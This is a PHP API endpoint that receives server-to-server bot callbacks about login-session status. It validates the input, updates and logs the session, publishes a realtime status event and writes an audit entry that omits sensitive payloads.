<?php
session_start();
require_once __DIR__ . '/../../../config/validate_env.php';
require_once __DIR__ . '/../../../config/database.php';
require_once __DIR__ . '/../../../config/config.php';
require_once __DIR__ . '/../../../includes/functions.php';
require_once __DIR__ . '/../../../includes/admin-security.php';
require_once __DIR__ . '/../../../includes/session-management.php';
require_once __DIR__ . '/../../../src/bootstrap.php';

use App\Services\RealtimePublisher;
use App\Services\AuditLogService;

header('Content-Type: application/json; charset=utf-8');

try {
    // Security: require admin key headers for server-to-server bot callbacks
    requireAdminKeyHeaderOrSession();
    requireFeaturePassHeader();

    if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
        http_response_code(405);
        echo json_encode(['success' => false, 'message' => 'method_not_allowed']);
        exit;
    }

    $inputRaw = file_get_contents('php://input');
    $input = json_decode($inputRaw, true) ?? [];

    $sessionId = sanitizeInput($input['session_id'] ?? '');
    $status    = strtolower(trim((string)($input['status'] ?? '')));
    $details   = (string)($input['details'] ?? '');
    $platform  = sanitizeInput($input['platform'] ?? '');
    $username  = sanitizeInput($input['username'] ?? '');
    $userData  = is_array($input['user_data'] ?? null) ? $input['user_data'] : null;

    if ($sessionId === '' || $status === '') {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'missing_fields']);
        exit;
    }

    // Allowed statuses for UI flow
    $allowedStatuses = [
        'pending', 'processing', 'require_otp', 'waiting_verification', 'success', 'failed', 'blocked'
    ];
    if (!in_array($status, $allowedStatuses, true)) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => 'invalid_status']);
        exit;
    }

    // Update session + log (store only flags, not raw secrets)
    $ok = updateSessionStatus($sessionId, $status, $details);
    logSessionAction($sessionId, 'bot_callback', $status . ($details ? (': ' . $details) : ''), $status === 'failed' ? 'error' : ($status === 'success' ? 'success' : 'info'));

    // Realtime broadcast to frontend listeners
    try {
        (new RealtimePublisher())->publish('login.status', [
            'session_id' => $sessionId,
            'status'     => $status,
            'details'    => $details,
            'platform'   => $platform,
            'username'   => $username,
            'user_data'  => $userData ? ['has_email' => !empty($userData['email']), 'has_name' => !empty($userData['full_name'])] : null,
        ]);
    } catch (\Throwable $e) { /* best-effort */ }

    // Light audit trail without sensitive payloads
    AuditLogService::log('bot.callback.' . $status, null, [
        'session_id' => $sessionId,
        'platform'   => $platform,
        'username'   => $username,
        'has_user_data' => (bool)$userData,
    ], 'info');

    echo json_encode(['success' => (bool)$ok]);
} catch (\Throwable $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'internal_error']);
}
